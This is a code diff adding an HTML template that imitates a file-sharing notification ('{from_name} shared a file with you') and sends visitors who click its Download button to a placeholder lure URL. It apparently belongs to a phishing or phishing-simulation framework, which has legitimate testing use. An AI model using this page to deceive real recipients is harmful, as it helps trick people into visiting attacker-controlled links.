@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <title>{from_name} shared a file with you (1)</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    <style>
+
+        body {
+            background-color: #666;
+        }
+
+        #box {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            text-align: center;
+            background-color: #fff;
+            padding: 40px 40px;
+            transform: translate(-50%, -50%);
+            border-radius: 16px;
+            -webkit-box-shadow: 10px 10px 22px 0px rgba(0,0,0,0.75);
+            -moz-box-shadow: 10px 10px 22px 0px rgba(0,0,0,0.75);
+            box-shadow: 10px 10px 22px 0px rgba(0,0,0,0.75);
+        }
+
+        .message {
+            text-align: center;
+            font-size: 24px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .download {
+            text-align: center;
+        }
+
+    </style>
+</head>
+<body>
+    <div id="box">
+        <div class="message">
+            <p><strong>{from_name}</strong> shared a file with you.</p>
+        </div>
+        <div class="download">
+            <button type="button" class="btn btn-primary btn-lg" onclick="clickedDownload()">Download "{filename}"</button>
+        </div>
+    </div>
+
+    <script>
+        function clickedDownload() {
+            window.location.assign({lure_url_js});
+        }
+    </script>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script> 
+</body>
+</html>
